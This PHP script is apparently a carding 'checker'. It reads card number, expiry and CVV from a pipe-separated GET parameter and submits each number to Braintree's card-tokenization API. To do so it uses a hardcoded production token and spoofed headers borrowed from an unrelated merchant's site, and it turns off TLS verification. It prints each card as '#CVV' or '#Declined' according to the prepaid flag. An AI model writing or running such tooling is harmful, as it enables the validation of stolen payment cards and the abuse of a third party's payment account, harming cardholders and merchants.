
<?php

error_reporting(0);
    
function cap($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

$lista = explode('|', $_GET['lista']);
$cc = $lista[0];
$mm = $lista[1];
$yy = $lista[2];
$cv = $lista[3];
$bin = substr($cc, 0,6);
$cch = md5(time());


# Prepaid - check:
					
									

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Authorization: Bearer production_kt7kvptb_pt9w9xcrfx7fpjvt';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Origin: https://krownlab.com';
$headers[] = 'Referer: https://krownlab.com/';;
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"23c32d1a-7893-48d3-87ab-6dca7e65cf34"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"3","expirationYear":"2024","cvv":"","billingAddress":{}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
echo $curl = curl_exec($ch);
echo $prepaid = cap($curl, '"prepaid":"','"');
curl_close($ch);

$ncc = $_GET['lista'];
if ($prepaid == "YES") {
 echo "<font size=3 color='white'><b>$ncc</b> </span></i></font>#CVV<b></i></font>";
}

else {
 echo "<font size=3 color='white'><b>$ncc</b> </span></i></font>#Declined<font size=2 color='white'><font size=3 class='badge badge-light'></b></i></font><font size=3 class='badge badge-secondary'> $curl <b></i></font>";
}




